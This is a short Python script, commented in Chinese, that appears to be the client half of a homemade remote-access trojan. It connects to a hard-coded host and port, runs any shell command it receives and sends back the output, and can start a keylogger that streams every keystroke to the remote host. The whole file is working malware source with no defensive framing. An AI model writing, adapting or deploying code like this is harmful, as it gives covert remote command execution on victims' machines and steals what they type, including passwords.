import socket
import subprocess #用于执行函数的库
from pynput import keyboard
def on_press(key):
    #print(f"{key}")
    data=f'{key}'
    LINK.send(bytes(data,'utf-8'))
    if key==keyboard.Key.esc:
        return False

def on_release(key):
    if key == keyboard.Key.esc:
        return False
HOST='192.168.2.133'
PORT=1000
ADDR=(HOST,PORT)
LINK=socket.socket()
LINK.connect(ADDR)
while True:
    choose=LINK.recv(1024).decode('utf-8')
    if choose=='1':
        LINK.send(bytes('执行命令功能开启：','utf-8'))
        while True:
            message=LINK.recv(1024).decode('utf-8')
            if message=='esc':
                LINK.send(bytes('esc','utf-8'))
                break
            output=subprocess.getoutput(message)#将执行结果赋值给output
            #print(output)
            if output=='':#因为我在执行del key.txt时命令执行成功但是output为空字符串，导致传回信息错误，所以在这进行判断，如果没有返回值则在服务端打印：命令执行成功
                LINK.send(bytes('命令执行成功！','utf-8'))
            else:#执行命令只有三种返回：1、执行成功有返回值，2、执行成功无返回值吗，3、执行失败报错，使用if，else语句进行判断
                LINK.send(bytes(output,'utf-8'))
    elif choose=='2':
        with keyboard.Listener(on_press=on_press,on_releas=on_release) as lis:
            lis.join()

    elif choose=='3':#输入为3，断开连接
        LINK.close()
        break
